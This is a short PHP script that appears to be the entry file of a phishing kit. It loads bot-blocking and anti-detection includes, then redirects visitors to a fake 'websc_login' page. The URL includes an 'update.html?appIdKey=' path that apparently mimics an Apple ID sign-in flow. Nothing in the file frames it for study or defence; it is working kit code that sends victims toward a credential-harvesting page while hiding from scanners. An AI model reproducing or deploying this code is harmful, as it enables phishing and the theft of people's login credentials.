<?php 
############## include ############## ^_^!
session_start();
include 'file/inc/block.php';
include 'file/inc/anti.php.php';
############## header ############## ^_^!
header("LOCATION: ./websc_login/?ID=login&CN=".$cn."/".gmdate ("H-i-s")."/update.html?appIdKey=".md5('Adnan-7eza9')." ");
############## Sdina ############## ^_^!
?>
    